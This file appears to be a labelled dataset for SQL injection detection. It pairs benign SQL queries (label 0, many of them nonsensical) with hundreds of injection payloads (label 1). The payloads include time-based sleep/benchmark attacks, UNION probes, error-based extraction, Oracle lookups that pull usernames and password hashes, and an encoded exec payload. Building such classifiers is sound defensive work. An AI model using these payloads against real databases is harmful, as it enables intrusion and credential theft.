"SELECT user_id FROM employees WHERE description = 456;";0
1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele;1
select * from users where id  =  1 or .< union select 1,@@VERSION -- 1;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i;1
"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """;1
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ;0
SELECT * FROM darkness FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM using;0
|| myappadmin.adduser  (  'admin', 'newpass'  )   || ';1
1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#;1
1%' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  ';1
SELECT * FROM  ( SELECT nuts FROM little ) ;0
"DELETE FROM customers WHERE created_at = '2023-01-01';";0
1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa;1
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""fbqy"" like ""fbqy";1
1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #;1
UPDATE gun SET hungry =  'chair', City =  'screen' WHERE slow =  melted;0
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%';0
SELECT * FROM building WHERE shout NOT BETWEEN 'she' AND 'round';0
"UPDATE sessions SET created_at = 'active' WHERE user_id = '2023-01-01';";0
SELECT * FROM cowboy FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT not ( s )  FROM greatest UNION;0
"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy";1
"INSERT INTO inventory (id, quantity) VALUES (456, 'user123');";0
1'   )    )     )   union all select null,null,null#;1
select * from users where id  =  1 &@ or 1  =  1 -- 1;1
"-5591%""   )    )    order by 1--";1
SELECT animal FROM first;0
1' order by 1--;1
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """;1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn";1
ORDER BY 1,SLEEP(5);1
"INSERT INTO employees (created_at, price, description, user_id) VALUES (123, 'pending', 'user123', 'active');";0
select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1;1
1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ;1
"UPDATE orders SET price = 'user123' WHERE price = 'Sample text';";0
SELECT somebody ( s )  FROM private SELECT future FROM state;0
1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636;1
1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph;1
SELECT AVG ( against ) FROM note SELECT SUM ( deal ) ;0
1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
admin') or ('1'='1'/*;1
SELECT * FROM halfway WHERE topic = 'statement';0
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ';1
UNION ALL SELECT 1,2,3,4,5,6#;1
select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1;1
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb";1
1 and elt  (  2770  =  3669,3669  )  # sfls;1
1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq;1
1  )   as czeu where 1738  =  1738 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --;1
1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ;1
1'  )   where 3572  =  3572;1
23 OR 1  =  1;1
SELECT rhyme, fort+ ', ' + weigh+ ' ' + engineer+ ', ' + mad AS town  FROM honor;0
SELECT balloon ( s )  FROM correctly;0
1' in boolean mode  )   and sleep  (  5  )  #;1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh";1
select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1;1
SELECT brick;0
||utl_http.request  (  'httP://192.168.1.1/'  )  ||';1
SELECT * FROM rush FETCH FIRST 50 PERCENT ROWS ONLY;0
1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf;1
SELECT TOP 50 PERCENT * FROM western;0
"UPDATE users SET price = 456 WHERE description = 'user123';";0
-8504 where 3086  =  3086 or 1131  =  9188#;1
-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--;1
1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --;1
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +';1
select * from users where id  =  '1' or <. or 1  =  1 -- 1';1
"1"" and   (  3020  =  3020  )  *6703";1
SELECT COUNT ( DISTINCT swam )  FROM produce;0
1'  )   or sleep  (  5  )  #;1
AND 1=0;1
SELECT * FROM this ORDER BY article DESC;0
1%'   )    )     )   union all select null,null,null,null,null,null#;1
" select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1";1
1' in boolean mode  )   union all select null,null,null--;1
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct;0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ;1
1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'uwep'  =  'uwep;1
"DELETE FROM sessions WHERE name = 456;";0
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #;1
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--;1
' ';1
SELECT * FROM  ( SELECT art FROM most ) ;0
SELECT AVG ( specific ) FROM elephant;0
-5300' union all select 2750,2750,2750,2750,2750,2750--;1
"x' and email is NULL; --";1
1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ;1
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1";1
select * from users where id  =  1 union select  @ $,version  (    )   -- 1;1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1";1
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15;1
SELECT * FROM ranch WHERE instead = 'gas'  OR travel = 'variety';0
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """;1
1'+  (  select 'rsgi' where 2258  =  2258;1
1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --;1
"or 0  =  0 #""";1
SELECT * FROM ever WHERE setting LIKE '%clean%';0
ORDER BY 7;1
SELECT hair ( s ) FROM drove INNER JOIN;0
"INSERT INTO logs (quantity, name, email, description) VALUES ('Sample text', '2023-01-01', 'user123', '2023-01-01');";0
||'6;1
SELECT * FROM anywhere WHERE NOT mountain = 'aboard'  AND NOT motion = 'moment';0
1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
"DELETE FROM logs WHERE created_at = '2023-01-01';";0
"1""   )    )    as chal where 6661  =  6661";1
1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc;1
"-1263""  )   or 9323  =  9323#";1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
" end and    (    (     (  ""poee""  =  ""poee";1
-- &password  = ;1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1";1
1  )   as bfuy where 3879  =  3879 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i;1
1   )    )    or sleep  (  __TIME__  )  #;1
1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"1""  )   as qayu where 6222  =  6222 union all select null,null,null#";1
SELECT felt,seen FROM away WHERE fur = 'lie' UNION SELECT enemy, charge FROM become;0
admin' or 1=1/*;1
SELECT * FROM putting ORDER BY south DESC;0
"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """;1
SELECT AVG ( join ) FROM rocky;0
SELECT DISTINCT art FROM if;0
SELECT * FROM tongue 3;0
"INSERT INTO customers (user_id, quantity) VALUES ('Sample text', '2023-01-01');";0
"-8636""   )    )     )   union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--";1
SELECT * FROM living;0
"1"" union all select null,null,null,null,null,null,null,null#";1
1  )   and 3659  =  5475 and   (  8949  =  8949;1
1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ;1
1'||  (  select 'rqzu' from dual where 9516  =  9516 or elt  (  5873  =  5873,sleep  (  5   )    )   #;1
SELECT child AS seen, nobody AS [needs]  FROM make;0
1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929;1
1%' and elt  (  4249  =  4249,7259  )   and '%'  =  ';1
or pg_SLEEP(5)--;1
"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """;1
SELECT DISTINCT citizen FROM everywhere;0
-6122'   )    )     )   or 9243  =  6161--;1
-7941 or   (  5822  =  8754  )  *8754-- eepn;1
1%' rlike sleep  (  5  )  #;1
SELECT drawn ( s ) FROM closer INNER JOIN;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26;1
select * from users where id  =  1 +   (  .  )   union select null,@@VERSION -- 1;1
-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107;1
SELECT * FROM nearly;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)));1
-3088' or 6872  =  6872 and 'miwk'  =  'miwk;1
SELECT * FROM firm 3;0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""cuzi"" like ""cuzi";1
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#;1
"1""  )   union all select null#";1
SELECT COUNT ( lot ) FROM people;0
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10;1
1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  ';1
1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
SELECT * FROM shut WHERE larger NOT LIKE 'full%';0
SELECT * FROM rhythm ORDER BY favorite;0
admin' or '1'  =  '1'#;1
ORDER BY 31337#;1
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --;1
"SELECT name, email, quantity, id FROM users WHERE status = '2023-01-01';";0
"INSERT INTO users (quantity, description, id, email) VALUES ('2023-01-01', 'pending', 456, 'pending');";0
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#;1
1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
1'  )   where 2928  =  2928;1
SELECT event,charge,parts,explore,accident     (  (  carry JOIN location ON event.if =  jet.coast )   INNER JOIN environmentON Orders.rice =  lot.sawID ) ;0
SELECT * FROM burst WHERE voyage = 'period'  OR sign = 'poetry';0
"1%""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """;1
select * from users where id  =  '1' union select $ .,@@VERSION -- 1';1
SELECT TOP 50 PERCENT * FROM neighbor SELECT * FROM bone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shoot;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i;1
UNION SELECT @@VERSION,SLEEP(5),USER(),4#;1
1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690;1
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
1,  (  case when 6620  =  3092 then 1 else null end  )  ;1
-6637'   )    )    order by 1#;1
1 order by 1--;1
"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat";1
"1""   )    )    as eglv where 7412  =  7412 union all select null#";1
FROM  ( SELECT DISTINCT return FROM call ) ;0
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1';1
SELECT * FROM industry WHERE lunch BETWEEN '1996-07-01' AND '1996-07-31';0
1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786;1
"INSERT INTO inventory (status, email) VALUES ('user123', 456);";0
-7021' or 3038  =  3038;1
SELECT COUNT ( pot )  FROM be;0
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY;0
"INSERT INTO users (price, quantity, user_id) VALUES ('pending', 'Sample text', 456);";0
"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --";1
1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#;1
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#;1
1  )   as gbtj where 8175  =  8175;1
-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--;1
"SELECT id FROM employees WHERE name = 'active';";0
SELECT doubt ( s ) FROM copy INNER JOIN;0
ORDER BY 7--;1
1%' and 1736  =  4220;1
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#";1
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20;0
" end and   (  ""qkkn"" like ""qkkn";1
-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--;1
SELECT * FROM swept ORDER BY beginning, including;0
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--;1
1%'   )    )     )   and 3916  =  6327--;1
SELECT afterID AS ID, having AS fruit FROM partly;0
1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||';1
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1";1
SELECT * FROM by WHERE    NOT giant = 'school';0
"1"" where 8727  =  8727";1
1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368;1
-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--;1
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--;1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth;1
1'  )   where 6305  =  6305 rlike   (  select   (  case when   (  8326  =  9749  )   then 1 else 0x28 end   )    )   --;1
UEf;1
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +';1
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #;1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" like ""hrkf";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12;1
select * from users where id  =  '1' union select +#,@@VERSION -- 1';1
SELECT AVG ( Price ) FROM gift;0
"UPDATE orders SET quantity = 'user123' WHERE id = 'Sample text';";0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """;1
-7255' union all select 2127,2127,2127,2127,2127#;1
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty;0
1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||';1
SELECT * FROM age WHERE planet NOT LIKE '[bee]%';0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26;1
"1%""   )    )     )   union all select null,null,null#";1
' or ''&';1
1 or sleep(5)#;1
"-5190%"" or 8298  =  9306 and ""%""  =  """;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#;1
SELECT Employees.vowel, COUNT ( Orders.batID )  AS engineFROM    ( OrdersINNER JOIN beauty ON Orders.tillID  =  Employees.pitchID ) ;0
"DELETE FROM users WHERE created_at = 456;";0
-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--;1
UPDATE alphabet SET colony = 'cutting'WHERE taken = 'stems';0
"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --";1
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh";1
-9950' or 4425  =  1975;1
1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo;1
"-7635"" union all select 1284,1284,1284,1284,1284,1284#";1
1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ;1
%2A%28%7C%28mail%3D%2A%29%29;1
"-6214"" union all select 3323,3323#";1
SELECT tightly;0
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect';0
SELECT team FROM pack;0
1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #;1
"1"" and elt  (  8464  =  5761,5761  )   and ""ydmt"" like ""ydmt";1
SELECT AVG ( silk ) FROM edge;0
? or 1  =  1 --;1
1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --;1
SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee;0
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making';0
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl;1
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ";1
1'  )   union all select null,null,null,null,null,null--;1
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth';0
"INSERT INTO orders (name, price, id, quantity) VALUES ('pending', 'Sample text', 'john@example.com', 456);";0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i;1
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb";1
1'+  (  select qtyi where 7147  =  7147;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20;1
1' and sleep  (  5  ) ;1
-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#;1
1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll;1
1'   )    )    as vuzt where 4971  =  4971;1
SELECT * FROM heart 3 SELECT * FROM college;0
SELECT * FROM closely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sum;0
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk";1
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY;0
"SELECT description, price, name, email FROM products WHERE id = 123;";0
"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
-1076 union all select 3959,3959--;1
"""));waitfor delay '0:0:5'--";1
DELETE FROM eight;0
1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#;1
